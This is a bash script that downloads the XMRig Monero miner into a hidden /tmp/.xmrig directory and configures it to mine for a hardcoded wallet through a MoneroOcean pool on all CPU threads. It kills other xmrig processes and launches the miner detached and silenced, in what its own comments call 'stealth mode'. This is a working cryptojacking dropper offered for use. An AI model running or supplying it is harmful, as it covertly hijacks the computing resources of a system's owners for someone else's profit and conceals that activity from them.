#!/bin/bash

# ⚠️ Prepare environment
apt-get update -y
apt-get install -y curl lsb-release software-properties-common unzip git

# 🧬 Set variables
WALLET="4A6Dwm79aK7FeBxc4QCjY89kYQgL4nVHM23fhv5rQxPeU7mtM6nzhkaJyDTqdK3CH3ShmCPd9D5xSYxh7Gg5ysMrBnAyEp5"
WORKER="$(hostname)"
POOL="gulf.moneroocean.stream:10001"
THREADS=$(nproc)
DIR="/tmp/.xmrig"

# 💥 Kill old miner if running
pkill -f xmrig

# 🧹 Clean and prep
rm -rf $DIR
mkdir -p $DIR
cd $DIR

# 🔽 Download xmrig
curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
tar -xzf xmrig.tar.gz --strip-components=1
chmod +x xmrig

# 🧠 Generate config
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": true,
  "opencl": false,
  "cuda": false,
  "randomx": {
    "1gb-pages": false
  },
  "donate-level": 1,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET.$WORKER",
      "keepalive": true,
      "tls": false
    }
  ]
}
EOF

# 👻 Launch in stealth mode (background, disowned)
nohup ./xmrig -c config.json >/dev/null 2>&1 & disown

echo "[✔] Miner deployed & running in stealth on: $POOL with $THREADS threads 🧠"
